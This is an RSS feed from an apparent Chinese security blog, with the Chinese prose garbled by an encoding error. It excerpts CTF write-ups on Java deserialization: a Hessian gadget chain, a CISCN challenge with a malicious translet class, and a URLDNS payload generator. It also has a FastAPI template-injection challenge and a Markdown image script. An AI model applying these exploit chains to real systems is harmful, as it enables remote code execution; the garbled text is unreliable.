<?xml version="1.0" encoding="UTF-8"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>baozongwi's blog</title><link>https://baozongwi.xyz/</link><description>baozongwi's blog</description><lastBuildDate>Fri, 20 Feb 2026 20:57:03 +0800</lastBuildDate><atom:link href="https://baozongwi.xyz/" rel="self" type="application/rss+xml"/><item><title>0CTF2022 Hessian_onlyjdk</title><link>https://baozongwi.xyz/p/0ctf-2022-hessian-onlyjdk/</link><guid>https://baozongwi.xyz/p/0ctf-2022-hessian-onlyjdk/</guid><pubDate>Tue, 18 Nov 2025 21:34:05 +0800</pubDate><description> https://github.com/waderwu/My-CTF-Challenges/blob/master/0ctf-2022/hessian-onlyJdk/deploy/hessian-onlyJdk.jar
hint:
https://y4er.com/posts/wangdingbei-badbean-hessian2/
https://x-stream.github.io/CVE-2021-21346.html
ç¬¬ä¸€ä¸ª hint è¯´æ˜æ˜¯ä» toString æ–¹æ³•å‡ºå‘ï¼Œç¬¬äºŒä¸ª hint æ˜¯ä¸€æ¡ gadget
1 2 3 4 5 6 7 8 Rdn$RdnEntry#compareTo-&amp;amp;gt; XString#equal-&amp;amp;gt; MultiUIDefaults#toString-&amp;amp;gt; UIDefaults#get-&amp;amp;gt; UIDefaults#getFromHashTable-&amp;amp;gt; UIDefaults$LazyValue#createValue-&amp;amp;gt; SwingLazyValue#createValue-&amp;amp;gt; InitialContext#doLookup() ä½†æ˜¯çœ‹äº†çŸ¥é“åˆ›å®‡çš„æ–‡ç« å‘ç°
javax.swing.MultiUIDefaultsæ˜¯peotectç±»ï¼Œåªèƒ½åœ¨javax.swing.ä¸­ä½¿ç”¨ï¼Œè€Œä¸”Hessian2æ‹¿åˆ°äº†æ„é€ å™¨ï¼Œä½†æ˜¯æ²¡æœ‰setAccessableï¼ŒnewInstanceå°±æ²¡æœ‰æƒé™ æ‰€ä»¥è¦æ‰¾é“¾çš„è¯éœ€è¦ç±»æ˜¯publicçš„ï¼Œæ„é€ å™¨ä¹Ÿæ˜¯publicçš„ï¼Œæ„é€ å™¨çš„å‚æ•°ä¸ªæ•°ä¸è¦ç´§ï¼Œhessian2ä¼šè‡ªåŠ¨æŒ¨ä¸ªæµ‹è¯•æ„é€ å™¨ç›´åˆ°æˆåŠŸ æ‰€ä»¥è¿™æ¡é“¾å­çš„å¯ç”¨æ€§è¿˜å‰©ä¸‹
1 2 3 4 UIDefaults#get-&amp;amp;gt; UIDefaults#getFromHashTable-&amp;amp;gt; UIDefaults$LazyValue#createValue-&amp;amp;gt; SwingLazyValue#createValue-&amp;amp;gt; è€Œ UIDefaults æ˜¯ Hashtable çš„å­ç±»ï¼Œçœ‹ä¸‹SwingLazyValue#createValue
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 public Object createValue(UIDefaults var1) { try { ReflectUtil.checkPackageAccess(this.className); Class var2 = Class.forName(this.className, true, (ClassLoader)null); if (this.methodName != null) { Class[] var6 = this.getClassArray(this.args); Method var7 = var2.getMethod(this.methodName, var6); this.makeAccessible(var7); return var7.invoke(var2, this.args); } else { Class[] var3 = this.getClassArray(this.args); Constructor var4 = var2.getConstructor(var3); this.makeAccessible(var4); return var4.newInstance(this.args); } } catch (Exception var5) { return null; } } å¯ä»¥è°ƒç”¨ä»»æ„ public æ–¹æ³•ï¼Œæ‰€ä»¥åªéœ€è¦æ‰¾ä¸€æ¡ toString è§¦å‘Hashtable#getï¼Œå¹¶ä¸”åœ¨åé¢æ‹¼æ¥åˆé€‚çš„ public æ–¹æ³•çš„ gadgetï¼Œä½†æ˜¯ç”±äºä¸è€ƒè™‘ Transformer é“¾ï¼Œæ‰€ä»¥é€‰æ‹©æ‰¾é™æ€ public æ–¹æ³•ï¼Œä¾èµ–åªå­˜åœ¨ jdk8u324 å’Œ hessian2ï¼Œå…¶ä¸­jdkçš„ç‰ˆæœ¬æ»¡è¶³åŠ è½½ BCEL å­—èŠ‚ç ã€‚æ‰¾åˆ°JavaWrapper#_mainæ–¹æ³•</description><content:encoded> https://github.com/waderwu/My-CTF-Challenges/blob/master/0ctf-2022/hessian-onlyJdk/deploy/hessian-onlyJdk.jar
hint: â€¦</content:encoded></item><item><title>Hessianååºåˆ—åŒ–</title><link>https://baozongwi.xyz/p/hessian-deserialization/</link><guid>https://baozongwi.xyz/p/hessian-deserialization/</guid><pubDate>Tue, 18 Nov 2025 01:00:59 +0800</pubDate><description>åºåˆ—åŒ– HessianOutput å’Œ Hessian2Output éƒ½æ˜¯æŠ½è±¡ç±» AbstractHessianOutput çš„å®ç°ï¼ŒäºŒè€…çš„ writeObject æ–¹æ³•ä¸€è‡´ï¼Œæ ¹æ®ä¼ å…¥çš„ object çš„ç±»å‹ï¼Œè·å–å¯¹åº”éœ€è¦çš„åºåˆ—åŒ–å™¨ï¼Œè°ƒç”¨åºåˆ—åŒ–å™¨çš„ writeObject æ–¹æ³•åºåˆ—åŒ–æ•°æ®ã€‚ä»£ç å¦‚ä¸‹
1 2 3 4 5 6 7 8 public void writeObject(Object object) throws IOException { if (object == null) { this.writeNull(); } else { Serializer serializer = this.findSerializerFactory().getObjectSerializer(object.getClass()); serializer.writeObject(object, this); } } è·Ÿè¿› getObjectSerializer
1 2 3 4 public Serializer getObjectSerializer(Class&amp;amp;lt;?&amp;amp;gt; cl) throws HessianProtocolException { Serializer serializer = this.getSerializer(cl); return serializer instanceof ObjectSerializer ? ((ObjectSerializer)serializer).getObjectSerializer() : serializer; } è·Ÿè¿› getSerializer</description><content:encoded>åºåˆ—åŒ– HessianOutput å’Œ Hessian2Output éƒ½æ˜¯æŠ½è±¡ç±» AbstractHessianOutput çš„å®ç°ï¼ŒäºŒè€…çš„ writeObject æ–¹æ³•ä¸€è‡´ï¼Œæ ¹æ®ä¼ å…¥çš„ object çš„ç±»å‹ï¼Œè·å–å¯¹åº”éœ€è¦çš„åºåˆ—åŒ–å™¨ï¼Œè°ƒç”¨åºåˆ—åŒ–å™¨çš„ writeObject æ–¹æ³•åºåˆ—åŒ–æ•°æ®ã€‚ â€¦</content:encoded></item><item><title>Markdownç¬é—´è½¬ç§»å›¾ç‰‡è„šæœ¬</title><link>https://baozongwi.xyz/p/markdown-image-teleport-script/</link><guid>https://baozongwi.xyz/p/markdown-image-teleport-script/</guid><pubDate>Tue, 18 Nov 2025 00:43:17 +0800</pubDate><description>è‡ªç”¨çš„ï¼Œä¸€èˆ¬èªŠæŠ„ SU çš„ Writeup æ€»æ˜¯ä¼šæ¶ˆè€—å¾ˆä¹…æ—¶é—´ï¼Œä¸»è¦å°±æ˜¯ä»é£ä¹¦ä¸‹è½½å›¾ç‰‡åˆ°åšå®¢æ–‡ä»¶å¤¹å†…ï¼Œç„¶åå†åœ¨markdown æ–‡ç« ä¸­è®©å…¶ç”Ÿæ•ˆï¼Œè™½ç„¶ä¸‹è½½å›¾ç‰‡çš„è¿‡ç¨‹æˆ‘çœç•¥ä¸äº†ï¼Œä½†æ˜¯è½¬ç§»çš„è¯å¯ä»¥çœä¸‹ä¸å°‘æ—¶é—´ã€‚
ä¸æ­¤åŒæ—¶æˆ‘ä¹Ÿå·²ç»å˜æˆäº†æ‡’äººï¼Œä¹Ÿä¸è¯´æ˜¯æ‡’ï¼Œå› ä¸ºæœ‰ä¸¤ä¸ªç”µè„‘ï¼Œæ‰€ä»¥æˆ‘é€šå¸¸ä½¿ç”¨è¯­é›€ä½œä¸ºä»–ä»¬çš„åª’ä»‹ï¼Œä¹Ÿæ˜¯èªŠæŠ„åˆ°æœ¬åœ°åšå®¢ï¼Œæ‰€ä»¥è¿™ä¸ªè„šæœ¬ä¹Ÿä¼šè®©æˆ‘æ–¹ä¾¿å¾ˆå¤šğŸ˜œ
é¦–å…ˆç›´æ¥ä»è¯­é›€æˆ–è€…é£ä¹¦å¤åˆ¶åˆ°mdæ–‡æ¡£ï¼Œç„¶åä½¿ç”¨è„šæœ¬
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 import re import argparse from pathlib import Path def find_max_used_index(text, folder, ext): no_prefix = folder.strip() in (&amp;amp;#34;.&amp;amp;#34;, &amp;amp;#34;./&amp;amp;#34;) if no_prefix: pat = re.compile(r&amp;amp;#34;!\[[^\]]*\]\((?:\./)?([0-9]+)\.&amp;amp;#34; + re.escape(ext) + r&amp;amp;#34;\)&amp;amp;#34;) else: pat = re.compile(r&amp;amp;#34;!\[[^\]]*\]\(&amp;amp;#34; + re.escape(folder.rstrip(&amp;amp;#39;/&amp;amp;#39;)) + r&amp;amp;#34;/([0-9]+)\.&amp;amp;#34; + re.escape(ext) + r&amp;amp;#34;\)&amp;amp;#34;) max_idx = -1 for m in pat.finditer(text): i = int(m.group(1)) if i &amp;amp;gt; max_idx: max_idx = i return max_idx def replace_feishu_images(text, folder, start, end, alt, ext): remote_img_pat = re.compile(r&amp;amp;#34;!\[[^\]]*\]\((https://[^)]*)\)&amp;amp;#34;) idx = start limit = end if end is not None else None no_prefix = folder.strip() in (&amp;amp;#34;.&amp;amp;#34;, &amp;amp;#34;./&amp;amp;#34;) def repl(_): nonlocal idx if limit is not None and idx &amp;amp;gt; limit: return _.group(0) if no_prefix: s = f&amp;amp;#34;![{alt}]({idx}.{ext})&amp;amp;#34; else: s = f&amp;amp;#34;![{alt}]({folder.rstrip(&amp;amp;#39;/&amp;amp;#39;)}/{idx}.{ext})&amp;amp;#34; idx += 1 return s return remote_img_pat.sub(repl, text) def main(): p = argparse.ArgumentParser() p.add_argument(&amp;amp;#39;--md&amp;amp;#39;, required=True) p.add_argument(&amp;amp;#39;--folder&amp;amp;#39;, required=True) p.add_argument(&amp;amp;#39;--start&amp;amp;#39;, type=int) p.add_argument(&amp;amp;#39;--end&amp;amp;#39;, type=int) p.add_argument(&amp;amp;#39;--alt&amp;amp;#39;, default=&amp;amp;#39;img&amp;amp;#39;) p.add_argument(&amp;amp;#39;--ext&amp;amp;#39;, default=&amp;amp;#39;png&amp;amp;#39;) p.add_argument(&amp;amp;#39;--dry&amp;amp;#39;, action=&amp;amp;#39;store_true&amp;amp;#39;) args = p.parse_args() md_path = Path(args.md) text = md_path.read_text(encoding=&amp;amp;#39;utf-8&amp;amp;#39;) start = args.start if start is None: max_used = find_max_used_index(text, args.folder, args.ext) start = max_used + 1 if max_used &amp;amp;gt;= 0 else 0 new_text = replace_feishu_images(text, args.folder, start, args.end, args.alt, args.ext) if args.dry: print(new_text) else: md_path.write_text(new_text, encoding=&amp;amp;#39;utf-8&amp;amp;#39;) if __name__ == &amp;amp;#39;__main__&amp;amp;#39;: main() # python replace_feishu_images.py --md index.md --folder . --start 1 --end 14 --ext png # python replace_feishu_images.py --md 2025-RCTF.md --folder ../images/2025-RCTF --start 0 --end 76 --ext png RCTF æ€»å…±æœ‰ 0-76,77 å¼  pngï¼Œç„¶åå¯ä»¥è¯†åˆ«åˆ°å†ç¬é—´è½¬æ¢ï¼Œå°±ä¸ç”¨ä¸€æ­¥æ­¥çš„æ¥èªŠæŠ„äº†ã€‚</description><content:encoded>è‡ªç”¨çš„ï¼Œä¸€èˆ¬èªŠæŠ„ SU çš„ Writeup æ€»æ˜¯ä¼šæ¶ˆè€—å¾ˆä¹…æ—¶é—´ï¼Œä¸»è¦å°±æ˜¯ä»é£ä¹¦ä¸‹è½½å›¾ç‰‡åˆ°åšå®¢æ–‡ä»¶å¤¹å†…ï¼Œç„¶åå†åœ¨markdown æ–‡ç« ä¸­è®©å…¶ç”Ÿæ•ˆï¼Œè™½ç„¶ä¸‹è½½å›¾ç‰‡çš„è¿‡ç¨‹æˆ‘çœç•¥ä¸äº†ï¼Œä½†æ˜¯è½¬ç§»çš„è¯å¯ä»¥çœä¸‹ä¸å°‘æ—¶é—´ã€‚
ä¸æ­¤åŒæ—¶æˆ‘ä¹Ÿå·²ç»å˜æˆäº†æ‡’äººï¼Œä¹Ÿä¸è¯´æ˜¯æ‡’ï¼Œå› ä¸ºæœ‰ä¸¤ä¸ªç”µè„‘ï¼Œæ‰€ä»¥æˆ‘é€šå¸¸ä½¿ç”¨è¯­é›€ä½œä¸ºä»–ä»¬çš„åª’ä»‹ï¼Œä¹Ÿæ˜¯ â€¦</content:encoded></item><item><title>RCTF2025</title><link>https://baozongwi.xyz/p/rctf-2025/</link><guid>https://baozongwi.xyz/p/rctf-2025/</guid><pubDate>Mon, 17 Nov 2025 23:59:12 +0800</pubDate><description>å¢å¢å“‡æ–­å¥¶ğŸ˜…
https://su-team.cn/posts/63a9ee12.html</description><content:encoded>å¢å¢å“‡æ–­å¥¶ğŸ˜…
https://su-team.cn/posts/63a9ee12.html</content:encoded></item><item><title>CISCN2023 Deserbug</title><link>https://baozongwi.xyz/p/ciscn-2023-deserbug/</link><guid>https://baozongwi.xyz/p/ciscn-2023-deserbug/</guid><pubDate>Fri, 14 Nov 2025 00:53:01 +0800</pubDate><description> cn.hutool.json.JSONObject.put-&amp;amp;gt;com.app.Myexpect#getAnyexcept jdk8u202 é¢˜ç›®æç¤ºäº†ç±»ï¼Œjdk8u202 å’Œ 8u66 æˆ‘æ„Ÿè§‰æ˜¯ä¸€æ ·çš„
commons-collections-3.2.2.jar
hutool-all-5.8.18.jar
å…ˆå‡†å¤‡æ¶æ„ç±»
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 package org.deserbug; import com.sun.org.apache.xalan.internal.xsltc.DOM; import com.sun.org.apache.xalan.internal.xsltc.TransletException; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; import com.sun.org.apache.xml.internal.serializer.SerializationHandler; import java.io.IOException; public class Evil extends AbstractTranslet { static { try { Runtime.getRuntime().exec(&amp;amp;#34;calc&amp;amp;#34;); } catch (IOException e) { e.printStackTrace(); } } @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {} @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {} } commons-collections-3.2.2ï¼Œæ‰€ä»¥ InvokeTransformer ä¹‹ç±»çš„éƒ½ä¸èƒ½ä½¿ç”¨äº†ï¼Œå’Œ CC3 ä¸€æ ·ç”¨ TrAXFilterï¼Œé¢˜ç›®æç¤ºçš„ JSONObject ç±»å’Œ fastjson çš„å¹¶ä¸åŒï¼Œä¸æ˜¯ä»»æ„è§¦å‘ getter\setter æ–¹æ³•ï¼Œ</description><content:encoded> cn.hutool.json.JSONObject.put-&amp;amp;amp;gt;com.app.Myexpect#getAnyexcept jdk8u202 é¢˜ç›®æç¤ºäº†ç±»ï¼Œjdk8u202 å’Œ 8u66 æˆ‘æ„Ÿè§‰æ˜¯ä¸€æ ·çš„
commons-collections-3.2.2.jar â€¦</content:encoded></item><item><title>å…³äºæˆ‘ä½¿ç”¨Traeä¼˜åŒ–Stackè¿™ä»¶äº‹</title><link>https://baozongwi.xyz/p/trae-optimize-stack/</link><guid>https://baozongwi.xyz/p/trae-optimize-stack/</guid><pubDate>Thu, 13 Nov 2025 01:42:52 +0800</pubDate><description>ç°åœ¨çš„åšå®¢çœŸæ˜¯è¶Šæ¥è¶Šé¡ºçœ¼äº†ğŸ˜</description><content:encoded>æ˜¨å¤©ä¸‹åˆï¼Œåœ¨å…¬å¸é—²æ¥æ— äº‹ï¼Œæƒ³ç€è‡ªå·±çš„åšå®¢ä¸»é¢˜ Stack æœ‰å¾ˆå¤šå°ç»†èŠ‚éƒ½ä¸æ»¡æ„ï¼Œæœ€è¿‘ç”¨ Trae è¿™ä¸ª MCP Tools ä¹Ÿè¶Šæ¥è¶Šé¡ºæ‰‹ï¼Œäºæ˜¯æˆ‘æƒ³ç€è¦ä¸å°±å¾®å¾®çš„ä¼˜åŒ–ä¸€ä¸‹è‡ªå·±çš„ä¸»é¢˜ï¼Ÿ
è¯´å¹²å°±å¹²ï¼Œä¼˜åŒ–çš„åŠŸèƒ½å¦‚ä¸‹ï¼š
é¦–å…ˆè¦ä¼˜åŒ–çš„å°±æ˜¯å›¾ç‰‡çš„ç¯çª—ï¼Œç”±äºä¹‹å‰æœ‰ä¸ªç¯çª—ï¼Œä½†æ˜¯é‚£ä¸ªåŠŸèƒ½æˆ‘æ˜¯ä¸éœ€è¦çš„ï¼Œè€Œä¸”ä¸»é¢˜æ¸²æŸ“æ–‡ç« ä¸­ â€¦</content:encoded></item><item><title>Ctfshow Javaååºåˆ—åŒ–</title><link>https://baozongwi.xyz/p/ctfshow-java-deserialization/</link><guid>https://baozongwi.xyz/p/ctfshow-java-deserialization/</guid><pubDate>Wed, 12 Nov 2025 09:06:07 +0800</pubDate><description>åœ¨åšé¢˜ä¹‹å‰å…ˆè¯´ä¸€ä»¶äº‹ï¼Œå…ˆæ‰“æœ¬åœ°å†æ‰“è¿œç¨‹ğŸ˜
web846 ç›´æ¥æ‰“urldnsé“¾å³å¯ï¼Œç”¨çš„ jdk8u66
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 package org.example.cc; import java.io.*; import java.net.URL; import java.net.URLStreamHandler; import java.net.URLConnection; import java.net.InetAddress; import java.util.HashMap; import java.util.Base64; public class web846 { public static void main(String[] args) throws Exception { //String testUrl = &amp;amp;#34;https://pgdyxc8a.requestrepo.com/&amp;amp;#34;; String testUrl = &amp;amp;#34;https://4a99d5da-d941-472d-bf4c-7c60c221bf96.challenge.ctf.show/&amp;amp;#34;; byte[] payload = generatePayload(testUrl); String base64 = Base64.getEncoder().encodeToString(payload); System.out.println(&amp;amp;#34;[+] Payload Base64: &amp;amp;#34; + base64); System.out.println(&amp;amp;#34;[+] Payload å·²ç”Ÿæˆ: å­—èŠ‚æ•°ç»„&amp;amp;#34;); System.out.println(&amp;amp;#34;[*] å¼€å§‹ååºåˆ—åŒ–...&amp;amp;#34;); deserializePayload(payload); } private static byte[] generatePayload(String url) throws Exception { URLStreamHandler handler = new SilentURLStreamHandler(); HashMap&amp;amp;lt;URL, String&amp;amp;gt; hashMap = new HashMap&amp;amp;lt;&amp;amp;gt;(); URL u = new URL(null, url, handler); hashMap.put(u, url); java.lang.reflect.Field hashCodeField = URL.class.getDeclaredField(&amp;amp;#34;hashCode&amp;amp;#34;); hashCodeField.setAccessible(true); hashCodeField.set(u, -1); return serialize(hashMap); } private static void deserializePayload(byte[] bytes) throws Exception { Object obj = unserialize(bytes); } public static byte[] serialize(Object obj) throws IOException { ByteArrayOutputStream baos = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(baos); oos.writeObject(obj); oos.close(); return baos.toByteArray(); } public static Object unserialize(byte[] bytes) throws IOException, ClassNotFoundException { ByteArrayInputStream bais = new ByteArrayInputStream(bytes); ObjectInputStream ois = new ObjectInputStream(bais); Object obj = ois.readObject(); ois.close(); return obj; } private static class SilentURLStreamHandler extends URLStreamHandler { protected URLConnection openConnection(URL u) throws IOException { return null; } protected synchronized InetAddress getHostAddress(URL u) { return null; } } }</description><content:encoded>åœ¨åšé¢˜ä¹‹å‰å…ˆè¯´ä¸€ä»¶äº‹ï¼Œå…ˆæ‰“æœ¬åœ°å†æ‰“è¿œç¨‹ğŸ˜
web846 ç›´æ¥æ‰“urldnsé“¾å³å¯ï¼Œç”¨çš„ jdk8u66
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 â€¦</content:encoded></item><item><title>CDUCTF 2025 Ezfastapi</title><link>https://baozongwi.xyz/p/cductf2025-ezfastapi/</link><guid>https://baozongwi.xyz/p/cductf2025-ezfastapi/</guid><pubDate>Tue, 04 Nov 2025 01:32:02 +0800</pubDate><description>åˆæ˜¯ä¸€å¹´æ–°ç”Ÿèµ›ï¼Œè¿™æ¬¡æˆ‘æ²¡æ€ä¹ˆå¸®å¿™ï¼Œä½†æ˜¯æˆ‘ä¹Ÿçœ‹åˆ°å¤§å®¶åšçš„ä¸é”™ï¼Œè™½ç„¶æˆ‘ä»¬åªæœ‰ä¸‰ä¸ªæ–¹å‘çš„é¢˜ç›®ï¼Œä½†æ˜¯è´¨é‡åœ¨æˆ‘é¢„æ–™ä¹‹å¤–çš„å¥½äº†~ğŸ˜
ç‰¹åˆ«é¸£è°¢ Xenny\NSSCTFã€cdusec
ez_fastapi è¿™æ¬¡åªæä¾›äº†ä¸€é“é¢˜ï¼Œè€Œä¸”æˆ‘çœ‹å¹³å°ä¸Šé¢æ˜¯å‡ºç½‘çš„ï¼Œä¸è¿‡ä¹Ÿæ— æ‰€è°“äº†ï¼Œä¸€è¡€è®©æ¥è”ç³»æˆ‘ä¹Ÿä¸æ¥ğŸ˜‘ï¼Œé‚£ä½ éœ¸ç‹èŒ¶å§¬ç»™æˆ‘å–äº†ğŸ˜
WriteUp æŸ¥çœ‹æ–‡ä»¶ï¼Œæ‹¿åˆ°æºç 
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 from fastapi import FastAPI, Request from fastapi.responses import JSONResponse from fastapi.templating import Jinja2Templates from jinja2 import Environment import uvicorn app = FastAPI() templates = Jinja2Templates(directory=&amp;amp;#34;templates&amp;amp;#34;) Jinja2 = Environment(variable_start_string=&amp;amp;#39;{&amp;amp;#39;, variable_end_string=&amp;amp;#39;}&amp;amp;#39;) @app.exception_handler(404) async def handler_404(request, exc): return JSONResponse(status_code=404, content={&amp;amp;#34;message&amp;amp;#34;: &amp;amp;#34;Not found&amp;amp;#34;}) @app.get(&amp;amp;#34;/&amp;amp;#34;) async def index(request: Request): return templates.TemplateResponse(&amp;amp;#34;index.html&amp;amp;#34;, {&amp;amp;#34;request&amp;amp;#34;: request}) @app.get(&amp;amp;#34;/shellMe&amp;amp;#34;) async def shellMe(request: Request, username=&amp;amp;#34;Guest&amp;amp;#34;): Jinja2.from_string(&amp;amp;#34;Welcome &amp;amp;#34; + username).render() return templates.TemplateResponse(&amp;amp;#34;shellme.html&amp;amp;#34;, {&amp;amp;#34;request&amp;amp;#34;: request}) def method_disabled(*args, **kwargs): raise NotImplementedError(&amp;amp;#34;æ­¤è·¯ä¸é€šï¼è¯¥æ–¹æ³•å·²è¢«ç®¡ç†å‘˜ç¦ç”¨ã€‚&amp;amp;#34;) app.add_api_route = method_disabled app.add_middleware = method_disabled if __name__ == &amp;amp;#34;__main__&amp;amp;#34;: uvicorn.run(app, host=&amp;amp;#39;0.0.0.0&amp;amp;#39;, port=8000) å¾ˆæ˜æ˜¾çš„SSTIæ¼æ´ï¼Œæ¢äº†æ¸²æŸ“ç¬¦ï¼Œæ‰€ä»¥å¯ä»¥ä½¿ç”¨{}ï¼Œä½†æ˜¯ç°åœ¨æœ‰é—®é¢˜ï¼Œæ— å›æ˜¾ï¼Œå¹¶ä¸”ä¸å‡ºç½‘ï¼Œéœ€è¦æ‰“å†…å­˜é©¬ï¼Œç„¶è€Œç¦ç”¨äº†</description><content:encoded>åˆæ˜¯ä¸€å¹´æ–°ç”Ÿèµ›ï¼Œè¿™æ¬¡æˆ‘æ²¡æ€ä¹ˆå¸®å¿™ï¼Œä½†æ˜¯æˆ‘ä¹Ÿçœ‹åˆ°å¤§å®¶åšçš„ä¸é”™ï¼Œè™½ç„¶æˆ‘ä»¬åªæœ‰ä¸‰ä¸ªæ–¹å‘çš„é¢˜ç›®ï¼Œä½†æ˜¯è´¨é‡åœ¨æˆ‘é¢„æ–™ä¹‹å¤–çš„å¥½äº†~ğŸ˜
ç‰¹åˆ«é¸£è°¢ Xenny\NSSCTFã€cdusec
ez_fastapi è¿™æ¬¡åªæä¾›äº†ä¸€é“é¢˜ï¼Œè€Œä¸”æˆ‘çœ‹å¹³å°ä¸Šé¢æ˜¯å‡ºç½‘çš„ï¼Œä¸è¿‡ä¹Ÿæ— æ‰€è°“äº†ï¼Œä¸€è¡€è®©æ¥è”ç³»æˆ‘ä¹Ÿä¸æ¥ğŸ˜‘ï¼Œé‚£ä½ éœ¸ç‹èŒ¶å§¬ç»™æˆ‘å–äº†ğŸ˜ â€¦</content:encoded></item></channel></rss>